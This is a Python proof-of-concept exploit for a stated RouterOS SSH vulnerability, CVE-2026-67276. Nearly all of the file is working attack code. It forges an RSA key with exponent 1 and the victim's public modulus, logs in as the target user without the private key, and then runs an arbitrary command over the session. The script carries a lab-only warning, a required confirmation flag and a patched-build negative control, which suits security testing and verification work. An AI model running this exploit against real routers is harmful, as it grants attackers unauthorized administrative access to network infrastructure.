#!/usr/bin/env python3
"""
poc_67276.py - CVE-2026-67276 (MikroTrick) SSH public-key auth-bypass PoC.

LAB USE ONLY - run ONLY against RouterOS instances you own and control.
Exploiting devices you do not own is a crime everywhere you are likely to
be reading this.

How it works (per CERT PL disclosure, cert.pl/en/posts/2026/09/mikrotik-routeros-cve/):
    RouterOS matches the SSH userauth public-key blob against the user's
    authorized key by (key type, modulus), omitting the exponent, and then
    verifies the signature using the exponent from the client-supplied blob.
    Presenting {ssh-rsa, e=1, n=victim modulus} makes sig^1 mod n == sig, so
    the valid "signature" is just the EMSA-PKCS1-v1_5 block of the auth data -
    forgeable by anyone who knows the victim's RSA modulus. No private key.

Preconditions:
  * username of a RouterOS user with an authorized RSA key
  * that key's public modulus (the disclosure's stated precondition)
  * vulnerable RouterOS: [7.24, 7.24.2) / [7.0.0, 7.23.4) / [6.0.0, 6.49.21)

Usage:
  python3 poc_67276.py --host 127.0.0.1 --port 2222 --username admin \
      --pubkey victim.pub --algos ssh-rsa,rsa-sha2-256 \
      --exec '/system resource print' --lab-i-own-this-target

  (alternative to --pubkey: --modulus-hex <hex of n>)
"""

import argparse
import sys

import paramiko
from paramiko.message import Message
from paramiko.pkey import PKey

from forge_67276 import (
    forged_public_blob,
    forged_signature,
    parse_openssh_rsa_pubkey,
)


class ForgeKey(PKey):
    def __init__(self, n: int, alg: str, exp_bytes: bytes = b"\x01"):
        super().__init__()
        self.public_blob = None  # keeps _get_key_type_and_bits on our path
        self.n = n
        self.alg = alg  # SIGNATURE algorithm (RFC 8332); blob type stays ssh-rsa
        self.exp_bytes = exp_bytes

    def get_name(self):
        return "ssh-rsa"  # key TYPE — constant, per RFC 8332 blob rules
    def asbytes(self):
        return forged_public_blob("ssh-rsa", self.n, self.exp_bytes)
    get_blob = asbytes

    def __bytes__(self):
        return self.asbytes()

    def get_fingerprint(self):
        import hashlib

        return hashlib.sha256(self.asbytes()).hexdigest()

    def sign_ssh_data(self, data, algorithm=None):
        alg = algorithm or self.alg
        return Message(forged_signature(data, alg, self.n))


def attempt(host, port, username, n, alg, timeout, exec_cmd, exp_bytes=b"\x01"):
    """One full connection per algorithm: RouterOS may drop the transport
    after a failed userauth, so attempts never share a transport."""
    t = paramiko.Transport((host, port))
    t.start_client(timeout=timeout)
    try:
        # Pin the USERAUTH signature algorithm: servers that do not send the
        # RFC 8308 server-sig-algs extension (e.g. 6.49.x) make paramiko
        # default to the first entry of its own preferred list otherwise.
        t._preferred_pubkeys = [alg]
        t.auth_publickey(username, ForgeKey(n, alg, exp_bytes))
        if not t.is_authenticated():
            return False, "server accepted neither PK_OK nor signature"
        if not exec_cmd:
            return True, None
        chan = t.open_session(timeout=timeout)
        chan.exec_command(exec_cmd)
        out = b""
        while True:
            while chan.recv_ready():
                out += chan.recv(4096)
            if chan.exit_status_ready() and not chan.recv_ready():
                break
        while chan.recv_ready():
            out += chan.recv(4096)
        return True, out.decode(errors="replace")
    finally:
        t.close()


def load_modulus(args) -> int:
    if args.modulus_hex:
        hx = (
            args.modulus_hex.strip()
            .lower()
            .replace("0x", "")
            .replace(":", "")
            .replace(" ", "")
        )
        if len(hx) % 2:
            raise ValueError("modulus hex must have even length")
        return int(hx, 16)
    if args.pubkey:
        with open(args.pubkey) as fh:
            n, e, comment = parse_openssh_rsa_pubkey(fh.read())
        if e != 1:
            print(
                f"[*] victim key parses: {n.bit_length()}-bit modulus, "
                f"e={e}, comment={comment!r}"
            )
        return n
    raise ValueError("need --pubkey or --modulus-hex")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[1])
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=22)
    ap.add_argument("--username", required=True, help="target RouterOS user")
    ap.add_argument("--pubkey", help="victim OpenSSH RSA public key file")
    ap.add_argument("--modulus-hex", help="victim RSA modulus as hex (alternative)")
    ap.add_argument(
        "--algos",
        default="ssh-rsa,rsa-sha2-256",
        help="comma list of signature algorithms to try (6.x: ssh-rsa, 7.x: rsa-sha2-256)",
    )
    ap.add_argument("--exec", dest="exec_cmd", help="command to run post-auth")
    ap.add_argument(
        "--exp-enc",
        choices=["canonical", "aligned"],
        default="canonical",
        help="e=1 mpint encoding: canonical (1 byte) or aligned (3 bytes, "
        "00 00 01 - matches the field width of a stored e=65537 key)",
    )
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument(
        "--lab-i-own-this-target",
        action="store_true",
        required=True,
        help="confirm the target is your own lab device",
    )
    args = ap.parse_args()

    n = load_modulus(args)
    print(
        f"[*] CVE-2026-67276 lab PoC | {args.username}@{args.host}:{args.port} | "
        f"{n.bit_length()}-bit modulus | forged key exponent e=1"
    )

    exp_bytes = b"\x00\x00\x01" if args.exp_enc == "aligned" else b"\x01"
    print(f"[*] exponent encoding: {args.exp_enc} ({exp_bytes.hex()})")
    for alg in [a.strip() for a in args.algos.split(",") if a.strip()]:
        print(f"[*] trying signature algorithm {alg} ...")
        try:
            ok, detail = attempt(
                args.host,
                args.port,
                args.username,
                n,
                alg,
                args.timeout,
                args.exec_cmd,
                exp_bytes,
            )
        except paramiko.AuthenticationException as exc:
            print(f"[-] {alg}: authentication rejected ({exc})")
            continue
        except Exception as exc:  # transport-level failure; try next alg
            print(f"[!] {alg}: transport error: {exc}")
            continue
        if ok:
            print(f"[+] AUTHENTICATED as {args.username!r} via forged e=1 key ({alg})")
            print("[+] CVE-2026-67276 confirmed on target")
            if detail:
                print("--- post-auth command output ---")
                print(detail)
            return 0
        print(f"[-] {alg}: {detail}")
    print()
    print("[-] all algorithms rejected. Checklist:")
    print("    - target version in vulnerable range? (6.49.20 / 7.23.3 / 7.24.1 ...)")
    print("    - username correct and has an RSA authorized key?")
    print("    - modulus from THAT key? (hash mismatch -> no match -> reject)")
    print("    - run the same command against the patched build (6.49.21 / 7.23.4)")
    print("      as negative control: it must also reject.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
